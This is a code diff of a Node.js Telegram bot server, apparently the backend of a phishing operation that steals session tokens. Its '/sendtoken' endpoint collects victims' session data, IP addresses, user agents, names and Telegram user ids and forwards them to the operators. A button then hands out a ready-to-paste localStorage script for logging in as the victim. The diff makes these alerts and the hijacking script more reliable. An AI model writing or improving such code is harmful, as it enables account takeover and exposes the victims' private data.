@@ -145,14 +145,17 @@ bot.on("text", async (msg) => {
 
 // send ready to use script, if button clicked
 bot.on("callback_query", (msg) => {
-  bot.sendMessage(
-    msg.message.chat.id,
+  bot.editMessageText(
     '```JS\nlocalStorage.setItem("account1", \'' +
-      msg.message.text +
+      msg.message.text.replaceAll(" ", "").replaceAll("\n", "") +
       "');\n```",
-    { parse_mode: "MarkdownV2" }
+    {
+      parse_mode: "MarkdownV2",
+      message_id: msg.message.message_id,
+      chat_id: msg.message.chat.id,
+    }
   );
-  bot.deleteMessage(msg.message.chat.id, msg.message.message_id);
+  // bot.deleteMessage(msg.message.chat.id, msg.message.message_id);
 });
 
 // remind if 59/30/15/5 minutes left!
@@ -181,31 +184,46 @@ app.post("/sendtoken", async (req, res) => {
   console.log(JSON.parse(Object.keys(req.body)[0]).data); // log data for emergencies
 
   // notification message
-  botIds.forEach((e) => {
-    bot.sendMessage(
+  botIds.forEach(async (e) => {
+    await bot.sendMessage(
       e,
-      `SOMEONE LOGGED IN!!
+      `*SOMEONE LOGGED IN\\!*
 
 at
-${Date().toString()}
+\`${Date().toString()}\`
 
 from user agent
-${req.header("user-agent")}
+\`${req.header("user-agent")}\`
 
 from IP
-${req.header("X-Real-Ip")}
+\`${req.header("X-Real-Ip")}\`
 
 possible name
-${data.firstName} ${data.lastName}`
+[${data.firstName ? data.firstName : "Unknown"} ${
+        data.lastName ? data.lastName : ""
+      }]`
+        .replaceAll("+", "\\+")
+        .replaceAll("(", "\\(")
+        .replaceAll(")", "\\)")
+        .replaceAll("/", "\\/")
+        .replaceAll(".", "\\.")
+        .replaceAll(",", "\\,")
+        .replaceAll("=", "\\=") + `(tg://user?id=${data.userId})`,
+      { parse_mode: "MarkdownV2" }
     );
 
     // data message
-    bot.sendMessage(e, "```\n" + JSON.stringify(data) + "```\n", {
-      parse_mode: "MarkdownV2",
-      reply_markup: JSON.stringify({
-        inline_keyboard: [[{ text: "Get script", callback_data: "1" }]],
-      }),
-    });
+    await bot.sendMessage(
+      e,
+      "```\n" + JSON.stringify(data, null, 2) + "```\n",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: JSON.stringify({
+          inline_keyboard: [[{ text: "Get script", callback_data: "1" }]],
+          disable_notification: true,
+        }),
+      }
+    );
   });
 
   res.send("yay"); //unused, but required by http protocol
